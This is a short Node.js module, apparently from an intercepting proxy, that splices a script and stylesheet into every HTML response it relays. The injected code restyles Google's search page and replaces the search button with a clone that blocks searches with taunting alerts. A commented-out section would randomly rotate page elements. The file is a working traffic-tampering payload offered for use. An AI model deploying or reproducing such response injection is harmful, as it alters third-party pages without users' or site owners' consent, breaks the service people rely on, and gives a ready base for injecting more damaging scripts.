const { Transform } = require('stream');

const payload = `
<style>
.jhp input[type="submit"], .sbdd_a input, .gbqfba {
    background: #0c57ff;
    color: #fff;
}
#searchform.big .RNNXgb {
    border-radius: 40%;
}
</style>
<script type="text/javascript">
let allowSubmit = false;
document.addEventListener("DOMContentLoaded", function() {
	setTimeout(() => {
		console.log('hooking into stuff 😈😈😈😈');

		const [ submitButton ] = Array.prototype.slice.call(
			document.querySelectorAll('input[aria-label="Google Search"]')
		).splice(-1,1);
		if (!submitButton) return;

		// hook submit button
		const submitButtonClone = submitButton.cloneNode(true);
		submitButton.parentNode.replaceChild(submitButtonClone, submitButton);
		submitButtonClone.addEventListener('click', (e) => {
			if (allowSubmit) return;
			e.preventDefault();
			e.stopPropagation();
			alert('Engit is here 😈');
			alert('You shall not pass!! 🚫');
		});
	}, 1000);
});

// Random orientations
// https://github.com/codebox/monkeyshine/blob/master/monkeyshine.js#L13
//['', '-ms-', '-webkit-', '-o-', '-moz-'].map(function(prefix){
//	Array.prototype.slice.call(document.querySelectorAll('div,p,span,img,a,body')).map(function(el){
//		el.style[prefix + 'transform'] = 'rotate(' + (Math.floor(Math.random() * 3) - 1) + 'deg)';
//	});
//});
</script>
`;

module.exports = ({ site }) => (isHtml) => new Transform({
  transform(chunk, encoding, callback) {
  	if (isHtml) {
  		chunk = Buffer.from(
			chunk.toString('utf8').replace('</body>', `</body>${payload}`)
		);
  	}
	this.push(chunk);
	callback();
  }
});
